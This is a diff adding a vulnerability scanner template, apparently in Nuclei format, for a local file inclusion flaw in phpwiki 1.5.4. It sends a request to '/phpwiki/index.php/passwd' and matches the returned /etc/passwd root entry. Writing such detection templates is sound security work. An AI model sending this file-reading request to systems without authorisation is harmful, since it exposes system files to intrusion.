@@ -1,0 +1,25 @@
+http:
+- matchers:
+  - regex:
+    - root:[x*]:0:0
+    type: regex
+  - status:
+    - 200
+    type: status
+  matchers-condition: and
+  method: GET
+  path:
+  - '{{BaseURL}}/phpwiki/index.php/passwd'
+id: phpwiki-lfi
+info:
+  author: 0x_Akoko
+  description: phpwiki 1.5.4 is vulnerable to cross-site scripting and local file
+    inclusion, and allows remote unauthenticated attackers to include and return the
+    content of locally stored files via the 'index.php' endpoint.
+  metadata:
+    max-request: 1
+  name: phpwiki 1.5.4 - Cross-Site Scripting/Local File Inclusion
+  reference:
+  - https://www.exploit-db.com/exploits/38027
+  severity: high
+  tags: xss,edb,phpwiki,lfi
